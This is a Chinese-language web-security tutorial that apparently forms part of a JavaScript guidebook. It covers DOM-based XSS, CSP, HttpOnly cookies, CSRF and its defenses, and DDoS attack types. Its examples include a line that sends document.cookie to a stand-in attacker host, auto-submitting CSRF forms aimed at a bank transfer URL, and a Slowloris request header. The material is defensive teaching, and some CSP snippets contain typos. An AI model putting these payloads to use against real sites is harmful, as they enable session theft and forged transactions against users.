DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。

如果用 Vue / React 技术栈，并且不使用 `v-html` / `dangerouslySetInnerHTML` 功能，就在前端 `render` 渲染阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。

以下方式都能把字符串作为代码运行：

- DOM 中的内联事件监听器：如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等
- HTML DOM 标签属性：`<a>` 标签的 `href` 属性
- JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等

如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。

```html
<!-- 内联事件监听器中包含恶意代码 -->
<img onclick="UNTRUSTED" onerror="UNTRUSTED" src="data:image/png," />

<!-- 链接内包含恶意代码 -->
<a href="UNTRUSTED">1</a>

<script type="application/javascript">
  // setTimeout()/setInterval() 中调用恶意代码
  setTimeout('UNTRUSTED');
  setInterval('UNTRUSTED');

  // location 调用恶意代码
  location.href = 'UNTRUSTED';

  // eval() 中调用恶意代码
  eval('UNTRUSTED');
</script>
```

如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。

##### 3.2.3.5 內容安全策略

**内容安全策略**（Content Security Policy，简称 CSP）是一种 **可信白名单** 作机制，来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。

**启用 CSP 方式**

1. 设置 HTTP 头信息的 Content-Security-Policy 字段

```http
content-security-policy: default-scr https:; connect-src https:; font-src https: data:; frame-src https: twitter:; img-src https: data:; media-src https:; object-src https:; script-src 'unsafe-inline' 'unsafe-eval' https:; style-src 'unsafe-inline' https:;
```

1. 通过网页 `<meta>` 标签

```html
<!-- 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) -->
<meta http-equiv="Content-Security-Policy" content="efault-src 'self'" />

<!-- 一个网站管理者允许内容来自信任的域名及其子域名 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self' *.trusted.com" />

<!-- 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者（获得），所有脚本必须从特定主机服务器获取可信的代码。 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com"
/>

<!-- 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src https://onlinebanking.jumbobank.com"
/>

<!--  一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容（从任意位置加载）。 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self' *.mailsite.com; img-src *" />
```

启用后，不符合 CSP 的外部资源就会被阻止加载。

严格的 CSP 在 XSS 的防范中可以起到下列的作用：

- 禁止加载外域代码，防止复杂的攻击逻辑
- 禁止外域提交，网站被攻击后，用户的数据不会泄漏到外域
- 禁止内联脚本执行（规则较严格，目前发现 Github 使用）
- 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）
- 合理使用上报可以及时发现 XSS，利于尽快修复问题

> 更多关于 CSP 的理解可以参考 [Content Security Policy（CSP）是什么？为什么它能低于 XSS 攻击？](https://www.zhihu.com/question/21979782)
>
> 或者查看关于 [HTTP CSP 内容安全策略](https://tsejx.github.io/javascript-guidebook//computer-networks/http/content-security-policy) 的整理。

##### 3.2.3.6 HTTPOnly Cookie

窃取网页 Cookie 的示例：

```js
new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
```

使用 HttpOnly Cookie 将重要的 Cookie 标记为 `http-only`，这样的话当浏览器向 Web 服务器发起请求的时就会带上 Cookie 字段，但是在 JavaScript 脚本中却不能访问这个 Cookie，这样就避免了 XSS 攻击利用 JavaScript 的 `document.cookie` 获取 Cookie。

在 Koa 中设置 Cookie `httpOnly` 属性：

```js
const Koa = require('koa');
const app = new Koa();

app.use(async (ctx) => {
  if (ctx.url === '/index') {
    ctx.cookie.set('cid', 'hello world', {
      // 写 Cookie 所在域名
      domain: 'localhost',
      // 写 Cookie 所在的路径
      path: '/index',
      // Cookie 有效时长
      maxAge: 10 * 60 * 1000,
      // Cookie 失效时间
      expires: new Date('2017-02-15'),
      // 是否只用于 HTTP 请求中获取
      httpOnly: true,
      // 是否允许重写
      overwrite: false,
    });

    ctx.body = 'Cookie is ok.';
  } else {
    ctx.body = 'Hello world!';
  }
});

app.listen(300, () => {
  console.log('[demo] Cookie is starting at port 3000');
});
```

在 Chrome 浏览器 Application 面板查看 Cookie 缓存可以直到哪些 Cookie 字段设置了 HttpOnly：

![](./img/3-2-3-6-HTTPOnly Cookie.jpg)

### 3.4 CSRF 跨站请求伪造攻击

**跨站请求伪造**（Cross-site Request Forgery，简称 CSRF）是一种挟制用户在当前已登录的 Web 页面上执行非本意的操作的攻击方法。

CSRF 攻击的本质是利用 cookie 会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充。

与 [XSS](https://tsejx.github.io/javascript-guidebook/computer-networks/web-security/xss) 相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

#### 3.4.1 攻击手段

CSRF 漏洞即利用网站权限校验漏洞在用户不知觉情况下发送请求，达到 **伪装** 用户的目的。

典型的 CSRF 攻击有着如下的流程：

1. 受害者登录 `a.com`，并保留了登录凭证 Cookie
2. 攻击者 **引诱** 受害者访问了 `b.com`
3. `b.com` 向 `a.com` 发送了一个请求：`a.com/act=xx`，浏览器会默认携带 `a.com` 的 Cookie
4. `a.com` 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求
5. `a.com` 以受害者的名义执行了 `act=xxx`
6. 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 `a.com` 执行了自己定义的操作

攻击者利用 CSRF 实现的攻击主要方式：

- 攻击者能够欺骗受害用户完成该受害者所允许的任一状态改变的操作
  - 如：更新账号信息、完成购物、注销甚至登陆等操作
- 获取用户的隐私数据
- CSRF 蠕虫
- 配合其他漏洞攻击

##### 3.4.1.1 GET类型

在受害者访问含有这个 `img` 的页面后，浏览器会自动向 `http://bank.example/transfer?account=xiaoming&amount=10000&for=hacker` 发出一次 HTTP 请求。`bank.example` 就会收到包含受害者登录信息的一次跨域请求。

```html
<img src="http://bank.example/transfer?amount=10000&for=hacker" />
```

##### 3.4.1.2 POST 类型

这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：

```html
<form action="http://bank.example/transfer" method="POST">
  <input type="hidden" name="account" value="xiaoming" />
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="for" value="hacker" />
</form>
<script>
  document.forms[0].submit();
</script>
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。

POST 类型的攻击通常比 GET 要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许 POST 上面。

##### 3.4.1.3 链接类型

链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种 **需要用户点击链接** 才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：

```html
<a href="http://test.com/csrf/transfer.php?amount=1000&for=hacker" taget="_blank">重磅消息！！</a>
```

由于之前用户登录了信任的网站，并且保存登录状态，只要用户主动访问上面的这个 PHP 页面，则表示攻击成功。

#### 3.4.2 攻击特点

- 攻击 **一般发起在第三方网站**，而不是被攻击的网站，被攻击的网站无法防止攻击发生
- 攻击 **利用受害者被攻击网站的登录凭证**，冒充受害者提交操作，而不是直接窃取数据
- 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是 **冒用**
- 跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 表单提交等等，部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪

对于服务器返回的结果，由于浏览器 **同源策略** 的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询金额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。

#### 3.4.3 防御策略

CSRF 通常从第三方网站发起，被攻击网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。

上文中讲了 CSRF 的两个特点：

- CSRF（通常）发生在第三方域名
- CSRF 攻击者不能获取到 Cookie 等信息，只能冒用

##### 3.4.3.1 防御思路

防御思路：

1. 我们能不能 **区分** 一个请求是来自于自己的前端页面，还是第三方的网站？
2. 怎么让自己的前端页面和伪造的请求变得 **不一样** 呢？

针对 CSRF 的特点制定防护策略：

- 阻止不明外域访问
  - 同源检测机制：服务器通过请求头附带的 `Origin` 和 `Referer` 字段确定请求的来源域
  - Samesite Cookie
- 提交时要求附加本域才能获取的信息
  - CSRF Token
  - 双重 Cookie 验证
- 保证网络请求由真实用户发出
  - 用户操作限制（验证码）

##### 3.4.3.2 同源检测机制

既然 CSRF 大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。

在 HTTP 协议中，每个一部请求都会携带两个 Header，用于标记来源域名：

- Origin Header
- Referrer Header

这两个 Header 在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。服务器可以通过解析这两个 Header 中的域名，确定请求的来源域。

**Origin**

使用 Origin Header 确定来源域名。

在部分与 CSRF 有关的请求中，请求的 Header 中会携带 Origin 字段。字段内包含请求的域名，不包含 `path` 及 `query` 部分。

```http
Origin: http://foo.example
```

如果 Origin 存在，那么直接使用 Origin 中的字段确认来源域名就可以。

但是 Origin 在以下两种情况下并不存在：

- IE11 同源策略：IE11 不会在跨站 CORS 请求上添加 Origin 标头，Referrer 头仍然是唯一的标识。最根本原因是因为 IE11 对同源的定义和其他浏览器不同，有两个主要的区别，可以参考 [MDN Same-origin_policy#IE_Exceptions](https://link.juejin.im/?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FSecurity%2FSame-origin_policy%23IE_Exceptions)
- 302 重定向：在 302 重定向之后 Origin 不包含在重定向的请求中，因为 Origin 可能会被认为是其他来源的敏感信息。对于 302 重定向的情况来说都是定向在新的服务器上的 URL，因此浏览器不想将 Origin 泄漏到新的服务器上。

**Referrer**

根据 HTTP 协议，在 HTTP 头中有一个字段叫 `referrer`，记录了该 HTTP 请求的来源地址。

- 对于 Ajax 请求，图片和脚本文件等资源请求，`referrer` 为发起请求的页面地址。
- 对于页面跳转，`referrer` 为打开页面历史记录的前一页面地址。

因此我们使用 Referrer 中链接的 Origin 部分可以得到 **请求的来源域名**。

这种方法并非万无一失，`referrer` 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 `referrer` 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 `referrer` 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的 `referrer`。

新版 Referrer Policy 规定了五种 Referrer 策略：

- No Referrer：`no-referrer`
- No Referrer When Downgrade：`no-referrer-when-downgrade`
- Origin Only：`origin`
- Origin When Cross-orgin：`origin-when-crossorigin`
- Unsafe URL：`unsafe-url`

**使用 Referer Policy 的方式**

1. CSP 响应头，通过 `referrer` 指令和五种可选的指令值，来指定 Referrer 策略

```http
Content-Security-Policy: referrer no-referrer | no-referrer-when-downgrade | origin | origin-when-cross-origin | unsafe-url;
```

1. `<meta>` 元数据标签也可以指定 Referrer 策略

```html
<!-- 在任何情况下，仅发送文件的源作为引用地址 -->
<meta name="referrer" content="origin" />
```

1. 外链标签中的 `referrer` 属性

或者用 `<a>`、`<area>`、`<img>`、`<iframe>`、`<script>` 或者 `<link>` 标签元素上的 `referrerpolicy` 属性为其设置独立的请求策略。

```html
<a href="http://example.com" referrerpolicy="origin"></a>
```

另外也可以在 `<a>`、`<area>` 或者 `<link>` 元素上将 `rel` 属性设置为 `noreferrer`。

```html
<a href="http://example.com" referrer="no-referrer|origin|unsafe-url">xxx</a>
```

这种方式作用的只是这一个链接。并且，`<a>` 标签可用的 Referrer 策略只有三种：不传、只传 host 和都传。另外，这样针对单个链接设置的策略优先级比 CSP 和 `<meta>` 要高。

> 当 Origin 和 Referrer 头文件不存在时该怎么办？如果 Origin 和 Referrer 都不存在，建议直接进行阻止，特别是如果您没有使用随机 CSRF Token 作为第二次检查。

##### 3.4.3.3 Cookie 的 SameSite 属性

Cookie 的 `SameSite` 属性能用于限制第三方 Cookie，从而减少安全风险。

```http
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

可取值：

- `Strict`：完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie
- `Lax`：大多数情况不发送第三方 Cookie，但是导航到目标网站的 GET 请求除外（导航到目标网址的 GET 请求：链接、预加载请求和 GET 表单）
- `None`

##### 3.4.3.5 CSRF Token

前面讲到 CSRF 的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用 Cookie 中的信息。而 CSRF 攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开，也可以防范 CSRF 的攻击。

步骤：

1. 用户使用用户名密码登陆，服务端下发一个 **随机的** Token 字段，并且服务端把这个字段保存在 Session 中
2. 客户端把这个 Token 保存起来，放到隐藏字段
3. 用户在登录状态下，在之后访问的时候，都要携带这个 Token 字段
4. 服务端从 Session 中拿出 Token 值进行对比，如果一致，说明请求合法
5. 用户推出，Session 销毁，Token 失效

**实现原理**

CSRF Token 的防护策略分为三个步骤：

1. 将 CSRF Token 输出到页面中

首先，用户打开页面的时候，服务器需要给这个用户生成一个 Token，该 Token 通过加密算法对数据进行加密，一般 Token 都包括随机字符串和时间戳的组合，显然在提交时 Token 不能再放在 Cookie 中了，否则又会被攻击者冒用。因此，为了安全起见 Token 最好还是存在服务器的 Session 中，之后在每次页面加载时，使用 JS 遍历整个 DOM 树，对于 DOM 中所有的 `<a>` 和 `<form>` 标签后加入 Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 HTML 代码，这种方法就没有作用，还需要开发者在编码时手动添加 Token

1. 页面提交的请求携带这个 Token

对于 GET 请求，Token 将附在请求地址之后，这样 URL 就变成 `http://url?csrftoken=tokenvalue`。 而对于 POST 请求来说，要在 `form` 的最后加上：

```html
<input type="”hidden”" name="”csrftoken”" value="”tokenvalue”" />
```

1. 服务器验证 Token 是否正确

当用户从客户端得到了 `token`，再次提交给服务器的时候，服务器需要判断 `token` 的有效性，验证过程是先解密 `token`，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个 Token 就是有效的。

这种方法要比之前检查 `referer` 或者 `origin` 要安全一些，`token` 可以在产生并放于 Session 之中，然后在每次请求时把 `token` 从 Session 中拿出，与请求中的 `token` 进行比对，但这种方法的比较麻烦的在于如何把 `token` 以参数的形式加入请求。

##### 3.4.3.6 分布式校验

在大型网站中，使用 Session 存储 CSRF Token 会带来很大的压力。访问单台服务器 session 是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的 HTTP 请求通常要经过像 Ngnix 之类的负载均衡器之后，再路由到具体的服务器上，由于 Session 默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次 HTTP 请求可能会先后落到不同的服务器上，导致后面发起的 HTTP 请求无法拿到之前的 HTTP 请求存储在服务器中的 Session 数据，从而使得 Session 机制在分布式环境下失效，因此在分布式集群中 CSRF Token 需要存储在 Redis 之类的公共存储空间。

由于使用 Session 存储，读取和验证 CSRF Token 会引起比较大的复杂度和性能问题，目前很多网站采用 Encrypted Token Pattern 方式。这种方法的 Token 是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的 Token，只用再次计算一次即可。

这种 Token 的值通常是使用 UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的 Token 一致，又能保证 Token 不容易被破解。

在 Token 解密成功之后，服务器可以访问解析值，Token 中包含的 UserID 和时间戳将会被拿来被验证有效性，将 UserID 与当前登录的 UserID 进行比较，并将时间戳与当前时间进行比较。

##### 3.4.3.7 双重 Cookie 验证

指在请求借口时，除了常规带上 Cookie 中的用户凭证信息，如 `session_id` 外，还把 Cookie 中的用户凭证信息读出来附在接口请求参数重；这种方案对比 CSRF Token 方案来说，好在不需要生成额外得 Token，也同样能够起到防御 CSRF 攻击的效果。

流程：

- 在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串（例如 `csrfcookie=v8g9e4ksfhw`）；
- 在前端向后端发起请求时，取出 Cookie，并添加到 URL 的参数中（接上例 POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）；
- 后端接口验证 Cookie 中的字段与 URL 参数中的字段是否一致，不一致则拒绝。

此方法相对于 CSRF Token 就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储 Token。

当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有 CSRF Token 高，原因我们举例进行说明。

由于任何跨域都会导致前端无法获取 Cookie 中的字段（包括子域名之间），于是发生了如下情况：

- 如果用户访问的网站为 `www.a.com`，而后端的 API 域名为 `api.a.com`。那么在 `www.a.com` 下，前端拿不到 `api.a.com` 的 Cookie，也就无法完成双重 Cookie 认证。
- 于是这个认证 Cookie 必须被种在 `a.com` 下，这样每个子域都可以访问。
- 任何一个子域都可以修改 `a.com` 下的 Cookie。
- 某个子域名存在漏洞被 XSS 攻击（例如 `upload.a.com`）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了 `a.com` 下的 Cookie。
- 攻击者可以直接使用自己配置的 Cookie，对 XSS 中招的用户再向 `www.a.com` 下，发起 CSRF 攻击。

##### 3.4.3.8 用户操作限制

CSRF 攻击过程中，用户是在不知情的情况下构造了网络请求，因此添加验证码能强制用户必须与应用进行交互，服务器通过验证码来识别是不是用户主动发送的请求，由于一定强度的验证码机器无法识别，因此危险网站不能伪造一个完整的请求。

- 优点：简洁有效，低成本
- 缺点：对用户不友好，无法给所有的操作都加上验证码

### 3.5 DDoS 攻击

DDoS 是英文 Distributed Denial of Service 的缩写，中文译作分布式拒绝服务。

那什么又是拒绝服务（Denial of Service）呢？

凡是能导致合法用户不能够正常访问网络服务的行为都算是拒绝服务攻击。也就是说拒绝服务攻击的目的非常明确，就是要阻止合法用户对正常网络资源的访问，从而达成攻击者不可告人的目的。

分布式拒绝服务攻击一旦被实施，攻击网络包就会从很多 DoS 攻击源犹如洪水般涌向受害主机。从而把合法用户的网络请求淹没，导致合法用户无法正常访问服务器的网络资源。

#### 3.5.1 攻击分类

##### 3.5.1.1 反射型

一般而言，我们会根据针对的协议类型和攻击方式的不同，把 DDoS 分成：

- SYN Flood
- ACK Flood
- Connection Flood
- UDP Flood
- NTP Flood
- SSDP Flood
- DNS Flood
- HTTP Flood
- ICMP Flood
- CC

每一种攻击类型都有其特点，而反射型的 DDoS 攻击是一种新的变种。攻击者并不直接攻击目标服务的 IP，而是利用互联网的某些特殊服务开放的服务器，通过伪造被攻击者的 IP 地址向有开放服务的服务器发送构造的请求报文，该服务器会将数倍于请求报文的回复数据发送到被攻击 IP，从而对后者间接形成 DDoS 攻击。

在反射型攻击中，攻击者利用了网络协议的缺陷或者漏洞进行 **IP 欺骗**，主要是因为很多协议（例如 ICMP、UDP 等）对源 IP 不进行认证。同时，要达到更好的攻击效果，黑客一般会选择具有放大效果的协议服务进行攻击。

总结一下就是利用 IP 欺骗进行反射和放大，从而达到四两拨千斤的效果。目前常见的反射攻击有：DNS 反射攻击、NTP 反射攻击、SSDP 反射攻击等。

> 注：将源地址设为假的无法回应，即为 SYN Flood 攻击。制造流量和攻击目标收到的流量为 1:1，回报率低。

##### 3.5.1.2 流量放大型

通过递归等手法将攻击流量放大的攻击类型，比如：以反射型中常见的 SSDP 协议为例，攻击者将 Search type 设置为 ALL。搜索所有可用的设备和服务，这种递归效果产生的放大倍数是非常大的，攻击者只需要以较小的伪造源地址的查询流量就可以制造出几十甚至上百倍的应答流量发送至目标。

##### 3.5.1.3 混合型

在实际情况中，攻击者只求达到打垮对方的目的。发展到现在，高级攻击者已经不倾向使用单一的攻击手段。而是根据目标系统的具体环境灵动组合，发动多种攻击手段。

比如：TCP 和 UDP、网络层和应用层攻击同时进行，这样的攻击既具备了海量的流量，又利用了协议、系统的缺陷，尽其所能地展开攻势。对于被攻击目标来说，需要面对不同协议、不同资源的分布式的攻击，分析、响应和处理的成本就会大大增加。

##### 3.5.1.4 脉冲波型

这是一种新型的 DDoS 攻击方法，给某些 DDoS 攻击解决方案带来了问题，因为它允许攻击者攻击以前认为是安全的服务器。之所以将这种新技术命名为脉冲波，是由于其攻击流量展现出来的图形看起来很像不连贯的重复的脉冲状。这类攻击通常呈现一个有上有下的斜三角形的形状，这个过程体现了攻击者正在慢慢地组装机器人并将目标对准待攻击的目标。

一次新的脉冲波攻击从零开始，在很短的时间跨度内达到最大值，然后归零，再回到最大值，如此循环重复，中间的时间间隔很短。脉冲波型 DDoS 相对难以防御，因为其攻击方式避开了触发自动化的防御机制。

##### 3.5.1.5 链路泛洪

随着 DDoS 攻击技术的发展，又出现了一种新型的攻击方式 Link Flooding Attack，这种方式不直接攻击目标而是以堵塞目标网络的上一级链路为目的。对于使用了 IP Anycast 的企业网络来说，常规的 DDoS 攻击流量会被分摊到不同地址的基础设施，这样能有效缓解大流量攻击。所以攻击者发明了一种新方法，攻击至目标网络 traceroute 的倒数第二跳，即上联路由，致使链路拥塞。

#### 3.5.2 攻击方法

DDoS 攻击从层次上可分为**网络层攻击**与**应用层攻击**，从攻击手法上可分为**快型流量攻击**与**慢型流量攻击**，但其原理都是造成资源过载，导致服务不可用。

##### 3.5.2.1 网络层 DDoS 攻击

网络层 DDoS 攻击常见手段有：SYN Flood、ACK Flood、Connection Flood、UDP Flood、ICMP Flood、TCP Flood、Proxy Flood 等。

**SYN Flood 攻击**

SYN Flood 攻击是一种利用 TCP 协议缺陷，发送大量伪造的 TCP 连接请求，从而使得被攻击方资源耗尽（CPU 满负载或内存不足）的攻击方式。建立 TCP 连接，需要三次握手（客户端发送 SYN 报文、服务端收到请求并返回报文表示接受、客户端也返回确认，完成连接）。

SYN Flood 就是用户向服务器发送报文后突然死机或掉线，那么服务器在发出应答报文后就无法收到客户端的确认报文（第三次握手无法完成），这时服务器端一般会重试并等待一段时间（至少 30s）后再丢弃这个未完成的连接。

一个用户出现异常导致服务器的一个线程等待一会儿并不是大问题，但恶意攻击者大量模拟（构造源 IP 去发送 SYN 包）这种情况，服务器端为了维护数以万计的半连接而消耗非常多的资源，结果往往是无暇理睬正常客户的请求，甚至崩溃。从正常客户的角度看来，网站失去了响应，无法访问。

**ACK Flood**

ACK Flood 攻击是在 TCP 连接建立之后进行的。所有数据传输的 TCP 报文都是带有 ACK 标志位的，主机在接收到一个带有 ACK 标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在。如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。如果在检查中发现该数据包不合法（例如：该数据包所指向的目的端口在本机并未开放），则主机操作系统协议栈会回应 RST 包告诉对方此端口不存在。

这里，服务器要做两个动作：查表、回应 ACK/RST。对比主机以及防火墙在接收到 ACK 报文和 SYN 报文时所做动作的复杂程度，显然 ACK 报文带来的负载要小得多。这种攻击方式显然没有 SYN Flood 给服务器带来的冲击大，因此攻击者一定要用大流量 ACK 小包冲击才会对服务器造成影响。所以在实际环境中，只有当攻击程序每秒钟发送 ACK 报文的速率达到一定的程度，才能使主机和防火墙的负载有大的变化。

当发包速率很大的时候，主机操作系统将耗费大量的精力接收报文、判断状态，同时要主动回应 RST 报文，正常的数据包就可能无法得到及时的处理。这时候客户端的表现就是访问页面反应很慢，丢包率较高。但是状态检测的防火墙通过判断 ACK 报文的状态是否合法，借助其强大的硬件能力可以较为有效的过滤攻击报文。当然如果攻击流量非常大，由于需要维护很大的连接状态表同时要检查数量巨大的 ACK 报文的状态，防火墙也会不堪重负导致网络瘫痪。

目前 ACK Flood 并没有成为攻击的主流，而通常是与其他攻击方式组合在一起使用。

**Connection Flood**

Connection Flood 是典型的并且非常有效的利用小流量冲击大带宽网络服务的攻击方式。这种攻击的原理是利用真实的 IP 地址向服务器发起大量的连接，并且建立连接之后很长时间不释放。长期占用服务器的资源，造成服务器上残余连接 (WAIT 状态) 过多，效率降低，甚至资源耗尽，无法响应其它客户所发起的连接。

其中一种攻击方法是每秒钟向服务器发起大量的连接请求，这类似于固定源 IP 的 SYN Flood 攻击，不同的是采用了真实的源 IP 地址。通常这可以在防火墙上限制每个源 IP 地址每秒钟的连接数来达到防护目的。

但现在已有工具采用慢速连接的方式，也即几秒钟才和服务器建立一个连接，连接建立成功之后并不释放并定时发送垃圾数据包给服务器使连接得以长时间保持。这样一个 IP 地址就可以和服务器建立成百上千的连接，而服务器可以承受的连接数是有限的，这就达到了拒绝服务的效果。

**UDP Flood 攻击**

由于 UDP 是一种无连接的协议，因此攻击者可以伪造大量的源 IP 地址去发送 UDP 包，此种攻击属于大流量攻击。正常应用情况下，UDP 包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。

**ICMP Flood 攻击**

此攻击属于大流量攻击，其原理就是不断发送不正常的 ICMP 包（所谓不正常就是 ICMP 包内容很大），导致目标带宽被占用。但其本身资源也会被消耗，并且目前很多服务器都是禁 ping 的（在防火墙里可以屏蔽 ICMP 包），因此这种方式已经落伍。

**Smurf 攻击**

这种攻击类似于 ICMP Flood 攻击，但它能巧妙地修改进程。Smurf 攻击通过使用将回复地址设置成受害网络的广播地址的 ICMP 应答请求数据包，来淹没受害主机。最终导致该网络的所有主机都对此 ICMP 应答请求做出答复，导致网络阻塞。更加复杂的 Smurf 将源地址改为第三方的受害者，最终导致第三方崩溃。

##### 3.5.2.2 应用层 DDoS 攻击

应用层 DDoS 攻击不是发生在网络层，是发生在 TCP 建立握手成功之后，应用程序处理请求的时候。常见的有：CC 攻击、DNS Flood、慢速连接攻击等。

**CC 攻击**

CC 攻击（Challenge Collapsar）是 DDoS 攻击的一种，其前身名为 Fatboy 攻击，也是一种常见的网站攻击方法。CC 攻击还有一段比较有趣的历史，Collapsar 是绿盟科技的一款防御 DDoS 攻击的产品品牌，Collapasar 在对抗拒绝服务攻击的领域内具有比较高的影响力和口碑。然而黑客为了挑衅，研发了一款 Challenge Collapasar 工具简称 CC，表示要向 Collapasar 发起挑战。

CC 攻击的原理就是借助代理服务器针对目标系统的消耗资源比较大的页面不断发起正常的请求，造成对方服务器资源耗尽，一直到宕机崩溃。因此在发送 CC 攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页。比如：需要查询数据库的页面、读写硬盘的文件等。相比其它的 DDoS 攻击 CC 更有技术含量一些，这种攻击你见不到真实源 IP。见不到特别大的异常流量，但造成服务器无法进行正常连接。

**Slowloris 攻击**

Slowloris 是一种慢速连接攻击，Slowloris 是利用 Web Server 的漏洞或设计缺陷，直接造成拒绝服务。其原理是：以极低的速度往服务器发送 HTTP 请求，Apache 等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务器链接饱和不可用。Slowloris 有点类似于 SYN Flood 攻击，只不过 Slowloris 是基于 HTTP 协议。

```http
GET / HTTP/1.1\r\n
Host: Victim host\r\n
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n
Content-Length: 42\r\n
```

完整的 HTTP 请求头结尾应该是两次的 `\r\n\r\n`，这里少了一次，因此服务器将会一直等待。

**Slow Attack**

Slow Attack 也是一种慢速 DoS 攻击，它通过消耗服务器的系统资源和连接数，导致 Web 服务器无法正常工作。常见的攻击方式包括 Slow Header、Slow Body 和 Slow Read。

1. Slow Header：正常的 HTTP Header 以两个 CLRF 结尾，通过发送只包含一个 CLRF 的畸形 Header 请求来占用 Web 服务器连接，从而达到消耗掉服务器所有可用的连接数。最终造成 Web 服务器资源饱和并拒绝新的服务。
2. Slow Read：向服务器请求很大的文件，然后通过设置 TCP 滑动窗口较小值，导致服务器以极慢的速度传输文件。这样，就会占用服务器大量的内存，从而造成拒绝服务。
3. Slow Body：在向服务器发送 HTTP Post 包时，指定一个非常大的 Content-Length 值，然后以极低的速度发包并保持连接不断，最终导致服务器连接饱和不可用。

Kali Linux 提供的专用测试工具 SlowHTTPTest 能够实现以上三种 Slow Attack 方式。

**JavaScript DDoS**

基于 JavaScript 的 DDoS 攻击利用的工具是普通网民的上网终端，这也意味着只要装有浏览器的电脑，都能被用作为 DDoS 攻击者的工具。当被操纵的浏览器数量达到一定程度时，这种 DDoS 攻击方式将会带来巨大的破坏性。

